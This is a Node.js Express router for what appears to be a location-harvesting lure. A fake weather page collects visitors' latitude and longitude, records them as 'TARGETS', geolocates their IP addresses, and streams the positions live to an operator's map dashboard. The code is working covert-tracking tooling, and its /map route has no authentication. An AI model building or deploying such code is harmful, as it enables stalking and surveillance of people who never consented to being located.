const express = require("express")
const router = express.Router()
const config = require("./config")


const TARGETS = {}

// login page 
router.route("/login").get((req, res) => {
    res.render("login")
}).post((req, res) => {
    const { username, password } = req.body

    if (config.username === username && config.password === password) {
        res.cookie("token", config.token, { maxAge: 1000000 * 100000 })
    }

    res.redirect("/")
})

// Default route - go straight to weather
router.route("/").get((req, res) => {
    res.render("weather")
})

router.route("/location").get((req, res) => {
    res.render("weather")
}).post((req, res) => {
    const { id, lat, lng } = req.body
    if (TARGETS[id] == null) {
        IO.emit("user-connected", id)
    }

    TARGETS[id] = [lat, lng]
    IO.emit("map-data", { id, lat, lng })
    res.send("OK")
    console.log(`> ${id} - ${TARGETS[id]}`)
})

router.route("/get-location").get(async (req, res) => {
    try {
        // Get client IP - handle various proxy scenarios
        let clientIP = req.headers['cf-connecting-ip'] || 
                      req.headers['x-forwarded-for']?.split(',')[0] ||
                      req.headers['x-real-ip'] ||
                      req.ip || 
                      req.socket.remoteAddress

        // Remove IPv6 prefix if present
        if (clientIP.includes('::ffff:')) {
            clientIP = clientIP.replace('::ffff:', '')
        }

        // Try maxmind first if available
        if (global.geoipReader) {
            try {
                const data = global.geoipReader.get(clientIP)
                if (data && data.location) {
                    return res.json({
                        lat: data.location.latitude,
                        lon: data.location.longitude,
                        city: data.city?.names?.en || 'Unknown',
                        country: data.country?.names?.en || 'Unknown'
                    })
                }
            } catch (e) {
                console.warn(`MaxMind lookup failed for ${clientIP}:`, e.message)
            }
        }

        // Fallback to API if maxmind fails or not available
        const response = await fetch(`https://ipapi.co/${clientIP}/json/`)
        const data = await response.json()
        
        if (data.latitude && data.longitude) {
            return res.json({
                lat: parseFloat(data.latitude),
                lon: parseFloat(data.longitude),
                city: data.city || 'Unknown',
                country: data.country_name || 'Unknown'
            })
        }

        // Final fallback to default location
        res.json({
            lat: 40.7128,
            lon: -74.0060,
            city: "New York",
            country: "United States"
        })
    } catch (error) {
        console.error('Location error:', error)
        res.json({
            lat: 40.7128,
            lon: -74.0060,
            city: "New York",
            country: "United States"
        })
    }
})

// Admin dashboard with secret key
router.route("/admin").get((req, res) => {
    const key = req.query.key
    
    if (key === config.adminKey) {
        res.render("home", { TARGETS })
    } else {
        res.status(403).send("Invalid admin key")
    }
})

router.route("/map").get((req, res) => {
    const { id } = req.query

    res.render("map", {
        data: TARGETS[id]
    })
})

// token checking
router.use(function checkToken(req, res, next) {
    const token = req.cookies.token

    if (token != null && token === config.token) {
        next()
    } else {
        res.clearCookie("token").redirect("/login")
    }
})

router.route("/dashboard").get((req, res) => {
    res.render("home", {
        TARGETS
    })
})


module.exports = router